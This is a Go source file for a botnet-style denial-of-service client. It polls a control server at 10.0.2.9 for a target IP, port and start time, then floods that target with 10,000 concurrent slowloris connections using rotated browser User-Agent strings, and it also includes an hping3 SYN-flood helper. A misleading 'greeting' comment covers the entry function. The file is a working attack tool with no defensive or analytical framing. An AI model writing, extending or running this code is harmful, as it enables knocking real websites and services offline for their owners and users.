package ddos

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os/exec"

	//"strings"
	"net"
	//"os"
	"sync"
	"time"

	"github.com/jasonlvhit/gocron"
)

var headers = []string{
	"GET / HTTP/1.1\r\n",
	"",
	"Accept-language: en-US,en,q=0.5\r\n",
	"Connection: Keep-Alive\r\n",
}
var choice = []string{
	"User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\r\n",
	"User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n",
	"User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\r\n",
}

type AttackInfo struct {
	Ip     string
	Port   string
	Date   string
	DateNs int64
}

// InitDDOS returns a greeting for the named person.
func InitDDOS(wg *sync.WaitGroup, name string) {
	// Return a greeting that embeds the name in a message.
	message := fmt.Sprintf("Hi, %v. Welcome!", name)
	fmt.Println(message)
	cronCheckDDoS()
}

func cronCheckDDoS() {
	scheduler := gocron.NewScheduler()

	// Begin job immediately upon start
	//scheduler.Every(5).Second().From(gocron.NextTick()).Do(checkDDoS)
	scheduler.Every(1).Day().From(gocron.NextTick()).Do(checkDDoS)

	// Start all the pending jobs
	<-scheduler.Start()
}

func checkDDoS() {
	attackInfo := new(AttackInfo)
	err := getAttackInfo("http://10.0.2.9", attackInfo)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println(attackInfo)
		cronAttackDDoS(attackInfo.Ip, attackInfo.Port, attackInfo.Date, attackInfo.DateNs)
	}
}

func cronAttackDDoS(ip string, port string, date string, dateNs int64) {
	scheduler := gocron.NewScheduler()

	// Begin job at a specific date/time
	t := time.Unix(0, dateNs)
	scheduler.Every(1).Second().From(&t).Do(attackDDoS, ip, port)

	//fmt.Println(ip + " attack scheduled")

	<-scheduler.Start()
}

func attackDDoS(ip string, port string) {
	test()
	ddosmain(ip + ":" + port)
//	slowloris(ip + ":" + port)
	test()
}

func getAttackInfo(url string, target interface{}) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}

	defer resp.Body.Close()
	return json.NewDecoder(resp.Body).Decode(target)
}

func slowloris(url string) {
	conn, err := net.DialTimeout("tcp", url, 2*time.Second)
	if err != nil {
		return
	}
	headers[1] = choice[rand.Intn(len(choice))]
	for _, header := range headers {
		_, err = fmt.Fprint(conn, header)
	}
	for {
		_, err = fmt.Fprintf(conn, "X-a: %v\r\n", rand.Intn(5000))
		if err != nil {
			defer slowloris(url)
			return
		}
		time.Sleep(15 * time.Second)
	}
}

func ddosmain(url string) {
	attackers := 10000
	x := randomNumber(15)
	time.Sleep(time.Duration(x) * time.Second)
	for {
		for i := 0; i < attackers; i++ {
			go slowloris(url)
		}
		time.Sleep(100 * time.Second)
		gocron.Remove(slowloris)
	}
}

func hping3(ip string, port string) {
	_, err := exec.Command("hping3", "--syn", ip, "-p", port, "--flood").Output()
	if err != nil {
		log.Fatal(err)
	}
}

func randomNumber(max int) int {
	rand.Seed(time.Now().UnixNano())
	min := 1
	return rand.Intn(max-min+1) + min
}

func test() {
	exec.Command("echo 'test' >> /tmp/tmp.txt").Output()
}
